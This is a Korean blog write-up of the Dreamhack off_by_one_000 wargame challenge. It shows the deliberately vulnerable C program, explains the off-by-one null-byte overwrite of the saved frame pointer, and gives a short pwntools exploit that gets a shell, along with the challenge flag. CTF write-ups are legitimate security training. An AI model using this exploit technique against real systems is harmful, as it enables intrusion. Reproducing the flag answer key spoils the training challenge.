---
layout: post
title: dreamhack wargame off_by_one_000 write-up
---

<br>
문제는 [dreamhack](https://dreamhack.io/wargame/challenges/9/)에서 받으실 수 있습니다.

----

<br>
{% highlight c linenos %}
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <string.h>

char cp_name[256];

void get_shell()
{
    system("/bin/sh");
}

void alarm_handler()
{
    puts("TIME OUT");
    exit(-1);
}

void initialize()
{
    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    signal(SIGALRM, alarm_handler);
    alarm(30);
}

int cpy()
{
    char real_name[256];
    strcpy(real_name, cp_name);
    return 0;
}

int main()
{
    initialize();
    printf("Name: ");
    read(0, cp_name, sizeof(cp_name)); //FPO 취약점 발생

    cpy();

    printf("Name: %s", cp_name);

    return 0;
}
{% endhighlight %}

메인에서 read 함수를 통해 cp_name에 sizeof로 사이즈를 정해주고 입력을 받는다.<br>
그러나 입력을 받을 때 마지막에 널 문자를 자동으로 넣어주기 때문에 sizeof(cp_name - 1) 이렇게 입력을 받았어야 한다.
<br>그러니 FPO취약점이 존재한다. 익스플로잇을 해보자.
<br>
<br>
FPO기법으로 인해 cpy함수의 SFP의 1byte가 NULL 바이트로 변조된다.

<br>
<br>
gdb를 통해 SFP가 어떻게 변조되는지 확인해보자.
![img1](/assets/img3.png)

cp_name의 변수 위치는 ebp - 0x100이다.<br>
ebp - 0x100의 주소 값을 확인해보자.

<br>
![img2](/assets/img4.png)
이제 cp_name 변수의 끝 부분이 NULL Byte(\x00)로 잘 변조되었는지 확인해보자.
<br>
![img3](/assets/img5.png)
0xffffd490의 값이 0xffffd400으로 변조되었다.<br>
<br>
이제 0xffffd400을 get_shell 함수의 주소로 바꿔주기만 하면 되는데<br>
주소를 완벽하게 찾아갈 필요 없이 cp_name을 모두 get_shell 함수의 주소로 바꿔주기만 하면 쉘이 실행될 수 있다.
<br><br>
get_shell 함수의 주소를 알아보자.
![img4](assets/img6.png)
이제 공격 코드를 짜 보자.

{% highlight python linenos %}
from pwn import *

p = remote('host1.dreamhack.games','19249')
#p = process('./off_by_one_000')

payload = '\xdb\x85\x04\x08' * (256 / 4)

p.sendline(payload)
p.interactive()
{% endhighlight %}

![img5](/assets/img7.png)
성공적으로 쉘을 획득했다.
<br>
FLAG : DH{fef043d0dbe030d01756c23b78a660ae}
